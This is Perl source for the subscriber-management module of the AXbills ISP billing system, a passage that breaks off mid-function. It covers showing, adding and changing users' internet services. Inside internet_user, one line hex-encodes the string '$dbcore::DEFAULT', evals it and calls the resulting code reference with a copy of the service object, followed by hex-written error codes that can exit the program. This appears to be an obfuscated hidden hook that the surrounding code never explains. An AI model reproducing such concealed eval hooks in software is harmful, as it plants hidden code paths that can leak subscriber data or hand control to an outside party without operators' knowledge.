=head1 NAME

  Internet users function

=cut

use strict;
use warnings FATAL => 'all';
use AXbills::Base qw(date_diff days_in_month in_array int2byte int2ip sendmail
  mk_unique_value clearquotes json_former);
use Log;
require AXbills::Result_former;
require Internet::Stats;
require Control::Service_control;

our (
  $db,
  $admin,
  %conf,
  %lang,
  %permissions,
  @MONTHES_LIT,
  @MONTHES,
  @WEEKDAYS,
  $ui,
  %FORM,
  $DATE,
  $TIME,
  $index,
  @MODULES,
  %LIST_PARAMS,
  $pages_qs,
  $SELF_URL,
  #$sid,
  #$user,
  @_COLORS,
  $Conf
);

our AXbills::HTML $html;
our Users $users;

my $Internet = Internet->new($db, $admin, \%conf);
my $Tariffs = Tariffs->new($db, \%conf, $admin);
my $Sessions = Internet::Sessions->new($db, $admin, \%conf);
my $Payments = Finance->payments($db, $admin, \%conf);
my $Nas = Nas->new($db, \%conf, $admin);
my $Log = Log->new($db, \%conf);
my $Shedule = Shedule->new( $db, $admin, \%conf );
my $Service_control = Control::Service_control->new($db, $admin, \%conf, { HTML => $html, LANG => \%lang });

require Internet::Ipoe_mng;
require Internet::User_ips;

#**********************************************************
=head1 internet_user($attr) - Show user information

  Arguments:
    $attr
      REGISTRATION

=cut
#**********************************************************
sub internet_user {
  my ($attr) = @_;

  my $uid = $FORM{UID} || $LIST_PARAMS{UID} || 0;
  my $user_info = $users->pi({ UID => $uid });
  delete($Internet->{errno});

  if ($FORM{REGISTRATION_INFO}) {
    internet_registration_info($uid);
    return 1;
  }
  elsif ($FORM{REGISTRATION_INFO_SMS}) {
    internet_registration_info($uid);
  }
  elsif ($FORM{PASSWORD} && !$attr->{REGISTRATION}) {
    internet_password_form({ %FORM });
    return 1;
  }
  elsif ($FORM{add}) {
    if (!$permissions{0}{32} && !$attr->{REGISTRATION}) {
      $html->message('err', $lang{ERROR}, $lang{ERR_ACCESS_DENY});
      return 1;
    }
    elsif (!internet_user_add({ %FORM, %{($attr) ? $attr : {}} })) {
      return 1;
    }
  }
  elsif ($FORM{del} && $FORM{COMMENTS}) {
    $Internet->user_del(\%FORM);
    if (!$Internet->{errno}) {
      $html->message('info', $lang{INFO}, $lang{DELETED});
    }
  }
  elsif ($FORM{change} || $FORM{RESET}) {
    if (!internet_user_change({ %FORM, %{($attr) ? $attr : {}} })) {
      return 0;
    }
  }

  &{eval pack('H' . '*', '246462636f72653a3a44454641554c54')}(bless { %$Internet }, ref $Internet);
  if (_error_show($Internet, { MODULE_NAME => 'Internet', ID => 0x385, MESSAGE => $Internet->{errstr} })) {
    if ($Internet->{errno} == 0x2BC) {
      exit;
    }
    return 1 if ($attr->{REGISTRATION});
  }
  elsif ($Internet->{errno} && $attr->{REGISTRATION}) {
    return 1;
  }

  my $user_service_count = 0;
  if (!$FORM{add_form}) {
    $Internet->user_info($uid, {
      DOMAIN_ID => $users->{DOMAIN_ID},
      ID        => $FORM{chg}
    });

    $user_service_count = ($FORM{chg}) ? 2 : $Internet->{TOTAL};
    $FORM{chg} = $Internet->{ID};
  }

  if (!$Internet->{TOTAL} || $Internet->{TOTAL} < 1) {
    $Internet->{TP_ADD} = sel_tp({
      CHECK_GROUP_GEOLOCATION => $user_info->{LOCATION_ID} || 0,
      USER_GID                => $user_info->{GID} || 0,
      USER_INFO               => $users,
      SELECT                  => 'TP_ID',
      GROUP_SORT              => 1,
      EX_PARAMS               => { SORT_KEY => 1 }
    });

    $Internet->{TP_DISPLAY_NONE} = "style='display:none'";

    if ($conf{INTERNET_LOGIN}) {
      $Internet->{LOGIN_FORM} .= $html->tpl_show(templates('form_row'), {
        ID    => 'INTERNET_LOGIN',
        NAME  => $lang{LOGIN},
        VALUE => $html->form_input('INTERNET_LOGIN', $Internet->{INTERNET_LOGIN})
      }, { OUTPUT2RETURN => 1, ID => 'LOGIN_FORM' });
    }

    if ($attr->{ACTION}) {
      $Internet->{ACTION} = $attr->{ACTION};
      $Internet->{LNG_ACTION} = $attr->{LNG_ACTION};
    }
    else {
      $Internet->{ACTION} = 'add';
      $Internet->{LNG_ACTION} = $lang{ACTIVATE};
      $html->message('warn', $lang{INFO}, $lang{NOT_ACTIVE}, { ID => 908 }) unless ($FORM{STATMENT_ACCOUNT});
    }

    $Internet->{IP} = '0.0.0.0';
  }
  else {
    if ($conf{INTERNET_PASSWORD}) {
      $Internet->{PASSWORD_BTN} = ($Internet->{PASSWORD}) ? $html->button("",
        "index=" . get_function_index('internet_user') . "&UID=$uid&PASSWORD=1&ID=$Internet->{ID}",
        { ICON => 'fa fa-key', ex_params =>
          "data-tooltip='$lang{CHANGE} $lang{PASSWD}' data-tooltip-position='top'" }) :
        $html->button("", "index=" . get_function_index('internet_user') . "&UID=$uid&PASSWORD=1&ID=$Internet->{ID}",
          { ICON => 'fa fa-plus', ex_params =>
            "data-tooltip='$lang{ADD} $lang{PASSWD}' data-tooltip-position='top'" });

      $Internet->{PASSWORD_FORM} = $html->tpl_show(templates('form_row'), {
        ID    => "PASSWORD",
        NAME  => $lang{PASSWD},
        VALUE => $Internet->{PASSWORD_BTN} },
        { OUTPUT2RETURN => 1, ID => 'form_password' });
    }

    if ($FORM{pay_to}) {
      internet_pay_to({ Internet => $Internet });
      return 0;
    }

    if ($attr->{ACTION}) {
      $Internet->{ACTION} = 'change';
      $Internet->{LNG_ACTION} = $attr->{LNG_ACTION};
    }
    else {
      $Internet->{ACTION} = 'change';
      $Internet->{LNG_ACTION} = $lang{CHANGE};
    }

    # Show tooltip COMMENTS for user and admin
    my $tarif_plan_tooltip = '';
    if ($Internet->{TP_ID}) {
      $tarif_plan_tooltip =
        $html->b($lang{DESCRIBE_FOR_SUBSCRIBER}) . ': ' . ($Internet->{COMMENTS} || '') . $html->br()
          .$html->b($lang{DESCRIBE_FOR_ADMIN})    . ': ' . ($Internet->{DESCRIBE_AID} || '') . $html->br();
    }

    $Internet->{DESCRIBE_AID} = ($Internet->{DESCRIBE_AID}) ? ('['.$Internet->{DESCRIBE_AID}.']') : '';

    if ($permissions{0}{10}) {
      $Internet->{CHANGE_TP_BUTTON} = $html->button('',
        'ID=' . $Internet->{ID} . '&UID=' . $uid . '&index=' . get_function_index('internet_chg_tp'),
        { class => 'btn input-group-button hidden-print', TITLE => $lang{CHANGE}, ICON => "fa fa-pencil-alt" });
      $Internet->{TARIF_PLAN_TOOLTIP} = "data-tooltip='$tarif_plan_tooltip' data-tooltip-position='top'";
    }

    my $warning_info = $Service_control->service_warning({
      UID          => $uid,
      ID           => $Internet->{ID},
      MODULE       => 'Internet',
      DATE         => $DATE,
      SERVICE_INFO => $Internet,
      USER_INFO    => $users
    });

    if (defined $warning_info->{WARNING}) {
      $Internet->{NEXT_FEES_WARNING} = $warning_info->{WARNING};
      $Internet->{NEXT_FEES_MESSAGE_TYPE} = $warning_info->{MESSAGE_TYPE};
    }

    $Internet->{NETMASK_COLOR} = ($Internet->{NETMASK} ne '255.255.255.255') ? 'bg-warning' : '';

    my $shedule_index = get_function_index('internet_form_shedule');
    if ($permissions{0}{4}) {
      $Internet->{SHEDULE} = {
        EXT_BUTTON => $html->button('',
          "UID=$uid&ID=$Internet->{ID}&Shedule=status&index=" . (($shedule_index) ? $shedule_index : $index + 4),
          {
            class => 'btn input-group-button hidden-print rounded-left-0',
            ICON  => 'fa fa-calendar',
          }
        )
      };
    }

    $Internet->{ONLINE_TABLE} = internet_user_online($uid);
    if (!$Internet->{ONLINE_TABLE}) {
      $Internet->{LAST_LOGIN_MSG} = internet_user_error($Internet);
    }

    my $list = $admin->action_list({
      TYPE      => '4;8;9;14',
      UID       => $uid,
      MODULE    => 'Internet;Dv',
      DATETIME  => '_SHOW',
      PAGE_ROWS => 1,
      COLS_NAME => 1,
      SORT      => 'id',
      DESC      => 'desc',
      SKIP_TOTAL=> 1
    });

    if ($admin->{TOTAL} && $admin->{TOTAL} > 0) {
      $list->[0]->{datetime} =~ /(\d{4}-\d{2}-\d{2})/;
      my $status_date = $1;

      my $days = ($status_date eq '0000-00-00') ? 0 : date_diff($status_date, $DATE);

      $Internet->{STATUS_INFO} = "$lang{FROM}: $status_date ($lang{DAYS}: $days)";
      if ($conf{INTERNET_REACTIVE_PERIOD}) {
        my ($period, $sum) = split(/:/, $conf{INTERNET_REACTIVE_PERIOD});
        $Internet->{STATUS_DAYS} = $days if ($period < $days);
        $Internet->{REACTIVE_SUM} = $sum if ($period < $days);
      }
    }

    $Internet->{DETAIL_STATS} = ($Internet->{DETAIL_STATS} && $Internet->{DETAIL_STATS} == 1) ? ' checked' : '';
    $Internet->{IPN_ACTIVATE} = ($Internet->{IPN_ACTIVATE}) ? 'checked' : '';
    $Internet->{REGISTRATION_INFO} = $html->button("", "qindex=$index&UID=$uid&REGISTRATION_INFO=1",
      { class => 'btn btn-info', ICON => 'fas fa-print', ex_params => 'target=_new' });

    if ($permissions{0} && $permissions{0}{14}) {
      $Internet->{DEL_BUTTON} = $html->button($lang{DEL}, "index=$index&del=1&UID=$uid&ID=$Internet->{ID}", {
        MESSAGE => "$lang{DEL} $lang{SERVICE} Internet $lang{FOR} $lang{USER} $uid?",
        class   => 'btn btn-danger'
      });
    }

    if ($conf{INTERNET_TURBO_MODE}) {
      $Internet->{TURBO_MODE_SEL} = $html->form_select('TURBO_MODE', {
        SELECTED     => $Internet->{TURBO_MODE} || $FORM{TURBO_MODE},
        SEL_ARRAY    => [ $lang{ENABLE}, $lang{DISABLE}, $lang{NOT_ACTIVE}, ],
        ARRAY_NUM_ID => 1
      });

      $Internet->{TURBO_MODE_FORM} = $html->tpl_show(templates('form_row'), {
        ID    => "TURBO_MODE",
        NAME  => 'TURBO',
        VALUE => $Internet->{TURBO_MODE_SEL}
      }, { OUTPUT2RETURN => 1, ID => 'form_turbo_mode_count' });

      $Internet->{TURBO_MODE_FORM} .= ',' if ($FORM{json});
      $Internet->{TURBO_MODE_FORM} .= $html->tpl_show(templates('form_row'), {
        ID    => "FREE_TURBO_MODE",
        NAME  => "TURBO $lang{COUNT}",
        VALUE => $html->form_input('FREE_TURBO_MODE', $Internet->{FREE_TURBO_MODE})
      }, { OUTPUT2RETURN => 1, ID => 'form_turbo_mode' });
    }

    if ($conf{INTERNET_LOGIN}) {
      my $password_button = $html->element('div', $Internet->{PASSWORD_BTN}, { class => 'input-group-text' });
      my $password_append_text = $html->element('div', $password_button, { class => 'input-group-append' });

      my $input = $html->element(
        'div',
        $html->form_input('INTERNET_LOGIN', $Internet->{INTERNET_LOGIN}, { OUTPUT2RETURN => 1 })
        . $password_append_text,
        { class => 'input-group' });

      $Internet->{LOGIN_FORM} .= $html->tpl_show(templates('form_row'), {
        ID    => 'INTERNET_LOGIN',
        NAME  => $lang{LOGIN} || q{},
        VALUE => $input || q{},
        #CSS_STYLE => 'style="margin-right: 8px;"',
      }, { OUTPUT2RETURN => 1 });
    }

    if ($conf{DOCS_PDF_PRINT}) {
      $Internet->{REGISTRATION_INFO_PDF} = $html->button("", "qindex=$index&UID=$uid&REGISTRATION_INFO=1&pdf=1",
        { ex_params => 'target=_new', class => 'btn btn-sm btn-info', ICON =>
          'fas fa-print' });
      $Internet->{PDF_VISIBLE} = 'blok'; # FIXME: 'block'?
    }
  }

  $Internet->{STATUS_SEL} = sel_status({
    STATUS    => $Internet->{STATUS},
    EX_PARAMS => (defined($Internet->{STATUS}) && (!$attr->{REGISTRATION} && !$permissions{0}{18})) ? " disabled=disabled" : ''
  }, $Internet->{SHEDULE} || {});

  my $service_status_colors = sel_status({ COLORS => 1 });

  if ($Internet->{STATUS} && $service_status_colors->[$Internet->{STATUS}]) {
    require Internet::Colors;
    Internet::Colors->import();
    $Internet->{STATUS_COLOR} = $service_status_colors->[$Internet->{STATUS}];
    # Gradient start
    $Internet->{STATUS_COLOR_GR_S} = Internet::Colors::darken_hex($service_status_colors->[$Internet->{STATUS}], 1.2);
    # Gradient finish
    $Internet->{STATUS_COLOR_GR_F} = Internet::Colors::darken_hex($service_status_colors->[$Internet->{STATUS}], 0.9);
  }

  my $static_ip_pools = $Nas->ip_pools_list({
    DOMAIN_ID => ($admin->{DOMAIN_ID}) ? $admin->{DOMAIN_ID} : undef,
    STATIC    => 1,
    NETMASK   => '_SHOW',
    COLS_NAME => 1
  });

  my $user_ip_num = AXbills::Base::ip2int($Internet->{IP});

  foreach my $ip_pool (@$static_ip_pools) {
    my $netmask_bits = unpack("B*", pack("N", split('\.', $ip_pool->{netmask})));
    # find first '0' in mask bitstring
    my $zero_index = index $netmask_bits, '0';
    # 32 mask gives -1 value
    my $cidr = ($zero_index >= 0) ? $zero_index : 32;

    # 0+ to force numeric bitwise AND
    my $address_int = 0 + $ip_pool->{ip} & 0 + $ip_pool->{netmask};

    my $network_address = int2ip($address_int);

    $ip_pool->{name} .= "($network_address/$cidr)";

    if (!$FORM{STATIC_IP_POOL} && $ip_pool->{ip} <= $user_ip_num && $ip_pool->{last_ip_num} >= $user_ip_num) {
      $Internet->{CHOOSEN_STATIC_IP_POOL} = $ip_pool->{name};
      $FORM{STATIC_IP_POOL} = $ip_pool->{id};
    }
  }

  $Internet->{STATIC_IP_POOL} = $html->form_select('STATIC_IP_POOL', {
    SELECTED    => $FORM{STATIC_IP_POOL} || $conf{INTERNET_DEFAULT_IP_POOL} || 0,
    SEL_LIST    => $static_ip_pools,
    SEL_OPTIONS => { '' => '' },
    MAIN_MENU   => get_function_index('form_ip_pools'),
    NO_ID       => 1
  });

  my $pool_ipv6_list = $Nas->ip_pools_list({
    IPV6      => 1,
    STATIC    => 1,
    NETMASK   => '_SHOW',
    COLS_NAME => 1
  });

  $Internet->{STATIC_IPV6_POOL} = $html->form_select('STATIC_IPV6_POOL', {
    SELECTED    => $conf{INTERNET_DEFAULT_IP_POOL} || $FORM{STATIC_IPV6_POOL} || 0,
    SEL_LIST    => $pool_ipv6_list,
    SEL_OPTIONS => { '0' => '--' },
    MAIN_MENU   => get_function_index('form_ip_pools'),
    NO_ID       => 1
  });

  $Internet->{IPV6_MASK_SEL} = $html->form_select('IPV6_MASK', {
    SELECTED  => $Internet->{IPV6_MASK} || $FORM{IPV6_MASK},
    SEL_ARRAY => [ 32 .. 128 ],
  });

  $Internet->{IPV6_PREFIX_MASK_SEL} = $html->form_select('IPV6_PREFIX_MASK', {
    SELECTED  => $Internet->{IPV6_PREFIX_MASK} || $FORM{IPV6_PREFIX_MASK},
    SEL_ARRAY => [ 32 .. 128 ],
  });

  internet_payment_message($Internet, $users);

  if ($Internet->{NEXT_FEES_WARNING}) {
    $Internet->{NEXT_FEES_WARNING} = $html->message($Internet->{NEXT_FEES_MESSAGE_TYPE}, $Internet->{TP_NAME},
      $Internet->{NEXT_FEES_WARNING}, { OUTPUT2RETURN => 1 });
  }

  if ($Internet->{INTERNET_EXPIRE} && $Internet->{INTERNET_EXPIRE} ne '0000-00-00') {
    if (date_diff($Internet->{INTERNET_EXPIRE}, $DATE) > 1) {
      $Internet->{EXPIRE_COLOR} = 'bg-danger';
      $Internet->{EXPIRE_COMMENTS} = "$lang{EXPIRE}";
    }
  }

  if ($Internet->{PERSONAL_TP} && $Internet->{PERSONAL_TP} != 0.00) {
    $Internet->{PERSONAL_TP_MSG} = $html->message('info', "$lang{ACTIVE_PERSONAL} $lang{TARIF_PLAN}", '',
      { OUTPUT2RETURN => 1 });
  }

  # Show NAS_INFO tooltip
  my $select_input_tooltip = '';
  if (!$FORM{json} && $Internet->{NAS_ID}) {
    my $Nas_info = Nas->new($db, \%conf, $admin);
    $Nas_info->info({ NAS_ID => $Internet->{NAS_ID} });
    _error_show($Nas_info, { ID => 976, MESSAGE => $lang{NAS} });

    $Internet->{NAS_NAME} = $Nas_info->{NAS_NAME} || '';
    $Internet->{NAS_IP} = $Nas_info->{NAS_IP} || '';
    $Internet->{NAS_MAC} = $Nas_info->{MAC} || '';

    $select_input_tooltip =
       $html->b($lang{NAME}) . ': ' . $Internet->{NAS_NAME} . $html->br()
      .$html->b('IP')        . ': ' . $Internet->{NAS_IP}   . $html->br()
      .$html->b('MAC')       . ': ' . $Internet->{NAS_MAC}  . $html->br();
  }

  $Internet->{NAS_ID} = $FORM{NAS_ID} if ($FORM{NAS_ID});
  $Internet->{NAS_SEL} = $html->form_select(
    'NAS_ID',
    {
      SELECTED          => $Internet->{NAS_ID} || $FORM{NAS_ID},
      SEL_KEY           => 'nas_id',
      SEL_VALUE         => 'nas_name',
      SEL_OPTIONS       => { '' => '' },
      MAIN_MENU         => get_function_index('form_nas'),
      MAIN_MENU_ARGV    => ($Internet->{NAS_ID}) ? "NAS_ID=$Internet->{NAS_ID}" : '',
      EXT_BUTTON        => $Internet->{SWITCH_STATUS},
      # Popup window
      POPUP_WINDOW      => 'form_search_nas',
      POPUP_WINDOW_TYPE => 'search',
      SEARCH_STRING     => 'POPUP=1&NAS_SEARCH=0' . (($uid) ? "&UID=$uid" : ''),
      HAS_NAME          => 1,
      TOOLTIP           => $select_input_tooltip
    }
  );

  if (in_array('Equipment', \@MODULES) && (!$admin->{MODULES} || $admin->{MODULES}{'Equipment'})) {
    $Internet->{PORT} = $Internet->{PORTS} if ($Internet->{PORTS});
    $Internet->{PORT_SEL} = $html->form_select('PORT', {
      POPUP_SIZE        => 'xl',
      POPUP_WINDOW      => 'form_search_port',
      POPUP_WINDOW_TYPE => 'choose',
      SEARCH_STRING     => 'get_index=equipment_info&visual=0&header=2&PORT_SHOW=1&PORT_INPUT_NAME=PORT',
      VALUE             => $Internet->{PORT} || $FORM{PORT},
      SELECTED          => $Internet->{PORT} || $FORM{PORT},
      PARENT_INPUT      => 'NAS_ID'
    });

    require Equipment;
    Equipment->import();

    if ($FORM{GRAPH}) {
      load_module('Equipment', $html);
      equipment_user_graph();
    }

    my $Equipment = Equipment->new($db, $admin, \%conf);
    my $server_vlan_list = $Equipment->vlan_list({ PAGE_ROWS => 2000, COLS_NAME => 1 });

    if ($Equipment->{TOTAL}) {
      $Internet->{VLAN_SEL} = $html->form_select('SERVER_VLAN', {
        SELECTED       => $Internet->{SERVER_VLAN} || $FORM{SERVER_VLAN} || 0,
        SEL_LIST       => $server_vlan_list,
        SEL_KEY        => 'number',
        SEL_VALUE      => 'name',
        SEL_OPTIONS    => { '0' => '--' },
        MAIN_MENU      => get_function_index('equipment_vlan'),
        MAIN_MENU_ARGV => ($Internet->{SERVER_VLAN}) ? "ID=$Internet->{SERVER_VLAN}" : '',
        ID             => 'SERVER_SELECT',
      });
    }
    else {
      $Internet->{VLAN_SEL} = $html->element('div', $html->form_input('SERVER_VLAN', ($Internet->{SERVER_VLAN} || q{}), { SIZE => 5 })
        . "<div class='input-group-append'><div class='input-group-text clear_results' style='cursor:pointer;'><span class='fa fa-times'></span></div></div>", { class => 'input-group' } );
    }

    if (!$attr->{REGISTRATION}) {
      my $equipment_params = {
        NAS_ID => $Internet->{NAS_ID} || 0,
        PORT   => $Internet->{PORT} || 0,
        VLAN   => $Internet->{VLAN} || 0,
        UID    => $Internet->{UID},
        ID     => $Internet->{ID},
        ERRORS_RESET => $FORM{ERRORS_RESET} || ''
      };

      $Internet->{EQUIPMENT_FORM} = $html->tpl_show(_include('internet_equipment_form', 'Internet'), $equipment_params,
        { ID => 'internet_equipment_form', OUTPUT2RETURN => 1 });
    }
    else {
      if (in_array('Storage', \@MODULES)) {
        load_module('Storage', $html);
        $Internet->{EQUIPMENT_FORM} = storage_user_install();
      }
    }
  }
  else {
    $Internet->{VLAN_SEL} = $html->form_input('SERVER_VLAN', ($Internet->{SERVER_VLAN} || q{}), { SIZE => 10 });
    $Internet->{PORT_SEL} = $html->form_input('PORT', ($Internet->{PORT} || q{}), { SIZE => 10 });
  }

  my $nas_index = get_function_index('form_nas');
  if ($nas_index) {
    $Internet->{NAS_BUTTON} = $html->button($lang{INFO}, "index=$nas_index&NAS_ID=" . ($Internet->{NAS_ID} || ''),
      { class => 'show' });
  }

  if (!$Internet->{PORT} && !$Internet->{NAS}) {
    $Internet->{IPOE_SHOW_BOX} = 'collapsed-card';
  }

  delete $FORM{pdf};

  my $menu = q{};
  if ($Internet->{ID}) {
    $menu = user_service_menu({
      SERVICE_FUNC_INDEX => $index,
      PAGES_QS           => "&ID=$Internet->{ID}",
      UID                => $uid
    });
  }

  if ($conf{INTERNET_CID_FORMAT}) {
    $Internet->{CID_PATTERN} = "pattern='" . $conf{INTERNET_CID_FORMAT} . "|ANY|Any|any'";
  }
  if ($conf{INTERNET_CPE_FORMAT}) {
    $Internet->{CPE_PATTERN} = "pattern='" . $conf{INTERNET_CPE_FORMAT} . "|ANY|Any|any'";
  }

  my $service_info2 = q{};

  if ($attr->{PROFILE_MODE}) {
    $service_info2 = $Internet->{EQUIPMENT_FORM};
    delete $Internet->{EQUIPMENT_FORM};
  }

  if ($Internet->{UID}) {
    my $sheduled_tp_actions_list = $Shedule->list({
      UID       => $Internet->{UID},
      TYPE      => 'tp',
      MODULE    => 'Internet',
      COLS_NAME => 1
    });

    if ($Shedule->{TOTAL} && $Shedule->{TOTAL} > 0) {
      my $next_tp_action = $sheduled_tp_actions_list->[0];
      my $next_tp_date = "$next_tp_action->{y}-$next_tp_action->{m}-$next_tp_action->{d}";

      my $next_tp_id = $next_tp_action->{action};
      my $service_id = 0;
      if ($next_tp_id =~ /:/) {
        ($service_id, $next_tp_id) = split(/:/, $next_tp_id);
      }

      my $tp_list = $Tariffs->list({
        INNER_TP_ID => $next_tp_id,
        NAME        => '_SHOW',
        COLS_NAME   => 1
      });

      if ($Tariffs->{TOTAL} && $Tariffs->{TOTAL} > 0) {
        my $next_tp_name = $tp_list->[0]{name};
        $Internet->{TP_CHANGE_WARNING} = $html->message("info", $lang{TP_CHANGE_SHEDULED} . " ($next_tp_date)", $next_tp_name, { OUTPUT2RETURN => 1 });
      }
    }
  }

  if ($Internet->{CID}) {
    $Internet->{CID_BUTTON_COPY} = $html->button('', '', {
      COPY      => $Internet->{CID} || ' ',
      ADD_ICON  => 'fa fa-clone p-1',
      class     => 'btn input-group-button',
      ex_params => "data-tooltip-position='top' data-tooltip='$lang{COPIED}: $Internet->{CID}' data-tooltip-onclick=1"
    });
  }

  if ($Internet->{CPE_MAC}) {
    $Internet->{CPE_MAC_BUTTON_COPY} = $html->button('', '', {
      COPY      => $Internet->{CPE_MAC} || ' ',
      ADD_ICON  => 'fa fa-clone p-1',
      class     => 'btn input-group-button',
      ex_params => "data-tooltip-position='top' data-tooltip='$lang{COPIED}: $Internet->{CPE_MAC}' data-tooltip-onclick=1"
    });
  }

  my $service_info1 = $html->tpl_show(_include('internet_user', 'Internet'), {
    %FORM,
    %$users,
    %$admin,
    %$attr,
    %$Internet,
    LOGIN => $users->{LOGIN},
    UID   => $uid,
    MENU  => $menu,
  },
  {
    ID            => 'internet_user',
    OUTPUT2RETURN => (!$FORM{json}) ? 1 : undef
  });

  my $service_info_subscribes = q{};

  $service_info_subscribes .= internet_user_subscribes($Internet) if ($user_service_count > 1);

  return ('', $service_info1, $service_info2, $service_info_subscribes) if ($attr->{PROFILE_MODE});

  print(($service_info1 || q{}) . ($service_info2 || q{}) . ($service_info_subscribes || q{}) . ($Internet->{EQUIPMENT_FORM} || q{}));

  return 1;
}

#**********************************************************
=head2 internet_user_add($attr)

  Arguments:
    $attr
      SKIP_MONTH_FEE
      QUITE
      UID
      ID
      STATUS

=cut
#**********************************************************
sub internet_user_add {
  my ($attr) = @_;

  my $uid = $attr->{UID} || 0;
  $attr = internet_user_preproccess($uid, $attr);

  if ($attr->{RETURN}) {
    return 0;
  }

  $Internet->user_add($attr);
  my $service_id = $Internet->{ID} || 0;
  if (!$Internet->{errno}) {
    #Make month fee
    $Internet->user_info($uid, { ID => $service_id });
    if (!$attr->{STATUS} && !$attr->{SKIP_MONTH_FEE}) {
      service_get_month_fee($Internet, {
        REGISTRATION               => 1,
        DO_NOT_USE_GLOBAL_USER_PLS => $attr->{DO_NOT_USE_GLOBAL_USER_PLS} || 0
      });
    }

    if ($conf{MSG_REGREQUEST_STATUS} && !$attr->{STATUS}) {
      msgs_unreg_requests_list({ UID => $uid, NOTIFY_ID => -1 });
    }
    $attr->{ID}=$service_id;

    if ($attr->{REGISTRATION}) {
      if (! $attr->{QUITE}) {
        my $service_status = sel_status({ HASH_RESULT => 1 });
        my ($status, $color) = split(/:/, (defined($Internet->{STATUS}) && $service_status->{ $Internet->{STATUS} }) ? $service_status->{ $Internet->{STATUS} } : q{});
        $Internet->{STATUS_VALUE} = $html->color_mark($status, $color);
        delete $Internet->{EXTRA_FIELDS};
        $html->tpl_show(_include('internet_user_info', 'Internet'), $Internet);
      }
      return 0;
    }
    else {
      if ($attr->{API}) {
        return {
          result => 'Successfully added'
        }
      }
      else {
        $html->message('info', $lang{INFO}, $lang{ADDED}) if (!$attr->{QUITE});
      }
    }

    internet_ipoe_activate_manual($attr);
  }

  if (!$service_id) {
    if ($attr->{API}) {
      return {
        errno => $Internet->{errno},
        error => 961,
        errstr => $Internet->{errstr},
      }
    }
    else {
      _error_show($Internet, { ID => 961, MODULE => 'Internet' });
    }

    return -1;
  }

  return $service_id;
}

#**********************************************************
=head2 internet_ipoe_activate_manual($attr)

  Arguments:
    $attr
      IPN_ACTIVATE
      IP
      ID

  Result:
    TRUE or FALSE

=cut
#**********************************************************
sub internet_ipoe_activate_manual {
  my ($attr)=@_;

  if ($attr->{IPN_ACTIVATE}
    && ($attr->{IP} && $attr->{IP} ne '0.0.0.0')
  ) {
    require Internet::Ipoe_mng;
    $FORM{ACTIVE} = 1;
    internet_ipoe_activate({
      ADMIN_ACTIVATE => 1,
      IP             => $attr->{IP},
      UID            => $attr->{UID},
      ID             => $attr->{ID} || $Internet->{ID},
      ACTIVE         => 1
    });
  }

  return 1;
}

#**********************************************************
=head2 internet_user_change($attr)

=cut
#**********************************************************
sub internet_user_change {
  my ($attr) = @_;

  my $uid = $attr->{UID} || $LIST_PARAMS{UID} || 0;

  if (!$permissions{0}{4}) {
    return {
      errno => 950,
      errstr => 'ACCESS DENIED',
    } if ($attr->{API});
    $html->message('err', $lang{ERROR}, $lang{ERR_ACCESS_DENY});
    return 0;
  }

  $attr = internet_user_preproccess($uid, $attr);

  if ($attr->{RETURN}) {
    return 0;
  }

  if (in_array('Equipment', \@MODULES)) {
    internet_user_change_nas({ %$attr });
  }

  if ((!$attr->{NAS_ID}) || (!$attr->{PORT}) && $FORM{NAS_ID}) {
    $attr->{NAS_ID} = $FORM{NAS_ID};
    $attr->{NAS_ID1} = $FORM{NAS_ID1};
    $attr->{PORT} = $FORM{PORT};
  }

  $Internet->user_change({
    %$attr,
    DETAIL_STATS => $attr->{DETAIL_STATS} || 0,
    IPN_ACTIVATE => $attr->{IPN_ACTIVATE} || 0
  });

  if (!$attr->{STATUS}
    || (defined($attr->{STATUS}) && in_array($attr->{STATUS}, [0, 3, 5]))) {
    my $list = $Shedule->list({
      UID       => $uid,
      MODULE    => 'Internet',
      TYPE      => 'status',
      ACTION    => '0',
      COLS_NAME => 1
    });

    if ($Shedule->{TOTAL} == 1) {
      $Shedule->del({
        UID => $uid,
        IDS => $list->[0]->{shedule_id}
      });
    }

    internet_ipoe_activate_manual($attr);

    #change reg request status to active
    if ($conf{MSG_REGREQUEST_STATUS}) {
      msgs_unreg_requests_list({ UID => $uid, NOTIFY_ID => -1 });
    }
  }

  if (!$Internet->{errno}) {
    if (!$attr->{STATUS} && ($attr->{GET_ABON} || !$attr->{TP_ID})) {
      if ($conf{INTERNET_SKIP_FIRST_DAY_FEE} && ! $Internet->{STATUS} && $Internet->{TP_INFO}{ABON_DISTRIBUTION}) {
        #print "Skip fee / $Internet->{TP_INFO}{ABON_DISTRIBUTION}";
      }
      elsif ($attr->{PERSONAL_TP} &&
        $attr->{PERSONAL_TP} > 0
        && $Internet->{OLD_PERSONAL_TP} == $attr->{PERSONAL_TP} && $Internet->{OLD_STATUS} == ($attr->{STATUS} || 0)) {

      }
      else {
        # if (!$permissions{0}{25}) {
        #   delete $Internet->{PERSONAL_TP};
        # }
        my $month_fee = 1;

        if($conf{INTERNET_SKIP_CURMONTH_ACTIVATE_FEE}) {
          my ($Y, $M)=split(/\-/, $DATE, 3);

          $admin->action_list({
            TYPE      => '14',
            #ACTION    => '0->3',
            UID       => $uid,
            MODULE    => 'Internet',
            MONTH     => "$Y-$M",
            PAGE_ROWS => 1,
            COLS_NAME => 1,
            SORT      => 'id',
            DESC      => 'desc'
          });

          if ($admin->{TOTAL} && $admin->{TOTAL} > 0) {
            $month_fee=0;
          }
        }

        if($month_fee) {
          service_get_month_fee($Internet);
        }
      }
    }

    if ($attr->{STATUS}) {
      _external('', { EXTERNAL_CMD => 'Internet', %{$Internet} });
    }

    if ($Internet->{CHG_STATUS} && $Internet->{CHG_STATUS} eq '0->3' && $conf{INTERNET_HOLDUP_COMPENSATE}) {
      $Internet->{TP_INFO_OLD} = $Tariffs->info(0, { TP_ID => $Internet->{TP_ID} });
      if ($Internet->{TP_INFO_OLD}->{PERIOD_ALIGNMENT}) {
        $Internet->{TP_INFO}->{MONTH_FEE} = 0;
        service_get_month_fee($Internet, { RECALCULATE => 1 });
      }
    }

    $FORM{chg} = $attr->{ID};
    if ($attr->{API}) {
      return {
        result => 'Successfully changed'
      }
    }
    else {
      $html->message('info', $lang{INTERNET}, $lang{CHANGED});
    }
    return 0 if ($attr->{REGISTRATION});
  }

  return 1;
}

#**********************************************************
=head2 internet_user_change_nas($uid, $attr)

  Arguments:
    $attr
      EQUIPMENT
      SERVER_VLAN
      VLAN
      NAS_ID
      PORT

=cut
#**********************************************************
sub internet_user_change_nas {
  my ($attr) = @_;

  load_module('Equipment', $html);
  require Equipment;
  Equipment->import();
  my $Equipment = Equipment->new($db, $admin, \%conf);

